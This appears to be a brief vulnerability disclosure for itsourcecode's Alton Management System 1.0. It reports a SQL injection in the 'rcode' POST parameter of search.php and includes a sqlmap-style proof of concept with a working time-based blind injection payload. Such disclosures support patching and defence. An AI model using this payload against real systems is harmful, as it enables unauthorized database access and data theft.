# Vendor

itsourcecode

# Product

Alton Management System

# version

1.0

Download Source Code: https://itsourcecode.com/wp-content/uploads/2020/02/altonsystem.zip

# Description

The rcode parameter can be passed in for querying on the "search.php" page, but due to the code's lax filtering of this parameter, it can lead to SQL injection.
<img width="1098" alt="image" src="https://github.com/user-attachments/assets/aa5fce7c-660e-441c-a3d0-42f00c93639f">

# Poc
```
Parameter: rcode (POST)
    Type: time-based blind
    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
    Payload: rcode=1' AND (SELECT 7363 FROM (SELECT(SLEEP(5)))sBIE) AND 'vFRq'='vFRq
```
